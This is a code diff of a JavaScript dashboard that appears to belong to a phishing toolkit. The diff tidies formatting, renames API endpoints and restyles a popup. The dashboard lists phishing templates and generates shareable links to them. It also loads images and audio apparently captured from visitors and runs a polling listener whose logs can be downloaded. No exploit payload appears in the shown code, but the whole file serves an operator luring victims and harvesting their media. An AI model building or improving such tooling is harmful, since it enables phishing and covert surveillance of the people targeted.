@@ -101,16 +101,16 @@ function check_new_version() {
 
 function loadImages() {
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', '/api/images', true);
-    xhr.onload = function() {
+    xhr.open('GET', '/api/images.php', true);
+    xhr.onload = function () {
         try {
             var response = JSON.parse(xhr.responseText);
             var container = document.getElementById('images-gallery');
             if (!container) return;
-            
+
             if (response.images && response.images.length > 0) {
                 var html = '';
-                response.images.forEach(function(img) {
+                response.images.forEach(function (img) {
                     html += `<div class="image-item" data-url="${img.url}">
                         <img src="${img.url}" alt="${img.name}"/>
                         <div class="image-filename">${img.name}</div>
@@ -133,16 +133,16 @@ function loadImages() {
 
 function loadAudio() {
     var xhr = new XMLHttpRequest();
-    xhr.open('GET', '/api/audio', true);
-    xhr.onload = function() {
+    xhr.open('GET', '/api/audio.php', true);
+    xhr.onload = function () {
         try {
             var response = JSON.parse(xhr.responseText);
             var container = document.getElementById('audio-list');
             if (!container) return;
-            
+
             if (response.audio && response.audio.length > 0) {
                 var html = '';
-                response.audio.forEach(function(audio) {
+                response.audio.forEach(function (audio) {
                     var timestamp = new Date(audio.timestamp * 1000).toLocaleString();
                     html += `<div class="audio-item">
                         <div class="audio-icon"><i class="fas fa-volume-up"></i></div>
@@ -204,15 +204,15 @@ function clearAllAudio() {
 function loadPhishingTemplates() {
     var xhr = new XMLHttpRequest();
     xhr.open('POST', '/list_templates.php', true);
-    xhr.onload = function() {
+    xhr.onload = function () {
         try {
             var data = JSON.parse(xhr.responseText);
             var container = document.getElementById('links-container');
             if (!container) return;
-            
+
             var html = '';
             if (Array.isArray(data) && data.length > 0) {
-                data.forEach(function(template) {
+                data.forEach(function (template) {
                     // Use current protocol (http:// or https://) and host
                     var url = location.protocol + "//" + location.host + "/templates/" + template.trim() + "/index.html";
                     html += `<div class="link-item">
@@ -242,42 +242,69 @@ function copyToClipboard(btn, url) {
         setTimeout(() => {
             btn.innerHTML = originalText;
         }, 2000);
-        
+
         if (window.Swal) {
             Swal.fire({
                 icon: 'success',
-                title: 'Copied!',
-                text: url,
-                timer: 1500,
-                showConfirmButton: false
+                title: '<span style="color: #10b981; font-weight: 700;">✓ Copied Successfully!</span>',
+                html: `<div style="
+                    background: linear-gradient(135deg, rgba(16, 185, 129, 0.1) 0%, rgba(59, 130, 246, 0.1) 100%);
+                    padding: 15px;
+                    border-radius: 12px;
+                    border-left: 4px solid #10b981;
+                    margin-top: 10px;
+                    font-family: 'Courier Prime', monospace;
+                    color: #94a3b8;
+                    word-break: break-all;
+                    text-align: left;
+                    font-size: 0.9rem;
+                    line-height: 1.6;
+                ">${url}</div>`,
+                timer: 2500,
+                timerProgressBar: true,
+                showConfirmButton: false,
+                background: 'linear-gradient(135deg, #1e293b 0%, #0f172a 100%)',
+                backdrop: 'rgba(0, 0, 0, 0.8)',
+                customClass: {
+                    popup: 'premium-popup',
+                    title: 'premium-title',
+                    htmlContainer: 'premium-content'
+                },
+                showClass: {
+                    popup: 'animate__animated animate__fadeInDown animate__faster'
+                },
+                hideClass: {
+                    popup: 'animate__animated animate__fadeOutUp animate__faster'
+                }
             });
         }
     });
 }
 
-window.addEventListener('load', function() {
+
+window.addEventListener('load', function () {
     console.log("Dashboard loading...");
-    
+
     // Initialize tabs first
     var tabButtons = document.querySelectorAll('.tab-btn');
     console.log("Found " + tabButtons.length + " tab buttons");
-    
-    tabButtons.forEach(function(btn) {
+
+    tabButtons.forEach(function (btn) {
         console.log("Setting up tab button for:", btn.getAttribute('data-tab'));
-        btn.addEventListener('click', function(e) {
+        btn.addEventListener('click', function (e) {
             e.preventDefault();
             var tabName = this.getAttribute('data-tab');
             console.log("Clicked tab:", tabName);
-            
+
             // Remove active class from all tabs and buttons
-            document.querySelectorAll('.tab-content').forEach(function(tab) {
+            document.querySelectorAll('.tab-content').forEach(function (tab) {
                 tab.classList.remove('active');
             });
-            
-            document.querySelectorAll('.tab-btn').forEach(function(b) {
+
+            document.querySelectorAll('.tab-btn').forEach(function (b) {
                 b.classList.remove('active');
             });
-            
+
             // Add active class to clicked button and corresponding tab
             this.classList.add('active');
             var targetTab = document.getElementById('tab-' + tabName);
@@ -287,7 +314,7 @@ window.addEventListener('load', function() {
             } else {
                 console.warn("Tab not found:", 'tab-' + tabName);
             }
-            
+
             // Load content for specific tabs
             if (tabName === 'images') {
                 loadImages();
@@ -296,17 +323,17 @@ window.addEventListener('load', function() {
             }
         });
     });
-    
-    setTimeout(function() {
+
+    setTimeout(function () {
         loadPhishingTemplates();
         console.log("Dashboard initialized successfully!");
-        
+
         var timer = setInterval(Listener, 2000);
         var isListening = true;
-        
+
         var btnRefreshImages = document.getElementById('btn-refresh-images');
         if (btnRefreshImages) {
-            btnRefreshImages.addEventListener('click', function() {
+            btnRefreshImages.addEventListener('click', function () {
                 var icon = this.querySelector('i');
                 if (icon) icon.classList.add('fa-spin');
                 loadImages();
@@ -315,15 +342,15 @@ window.addEventListener('load', function() {
                 }, 1000);
             });
         }
-        
+
         var btnClearImages = document.getElementById('btn-clear-images');
         if (btnClearImages) {
             btnClearImages.addEventListener('click', clearAllImages);
         }
-        
+
         var btnRefreshAudio = document.getElementById('btn-refresh-audio');
         if (btnRefreshAudio) {
-            btnRefreshAudio.addEventListener('click', function() {
+            btnRefreshAudio.addEventListener('click', function () {
                 var icon = this.querySelector('i');
                 if (icon) icon.classList.add('fa-spin');
                 loadAudio();
@@ -332,15 +359,15 @@ window.addEventListener('load', function() {
                 }, 1000);
             });
         }
-        
+
         var btnClearAudio = document.getElementById('btn-clear-audio');
         if (btnClearAudio) {
             btnClearAudio.addEventListener('click', clearAllAudio);
         }
-        
+
         var btnListen = document.getElementById('btn-listen');
         if (btnListen) {
-            btnListen.addEventListener('click', function() {
+            btnListen.addEventListener('click', function () {
                 if (isListening) {
                     clearInterval(timer);
                     this.innerHTML = '<i class="fas fa-play"></i> Start Listener';
@@ -356,10 +383,10 @@ window.addEventListener('load', function() {
                 }
             });
         }
-        
+
         var btnClear = document.getElementById('btn-clear');
         if (btnClear) {
-            btnClear.addEventListener('click', function() {
+            btnClear.addEventListener('click', function () {
                 var terminal = document.getElementById('log-terminal');
                 if (terminal) {
                     terminal.innerHTML = `<div class="log-entry">
@@ -370,14 +397,14 @@ window.addEventListener('load', function() {
                 log_history = [];
             });
         }
-        
+
         var btnDownload = document.getElementById('btn-download');
         if (btnDownload) {
-            btnDownload.addEventListener('click', function() {
+            btnDownload.addEventListener('click', function () {
                 saveTextAsFile(getFullLogs(), 'log.txt');
             });
         }
-        
+
         console.log("Dashboard initialized successfully!");
     }, 100);
 });
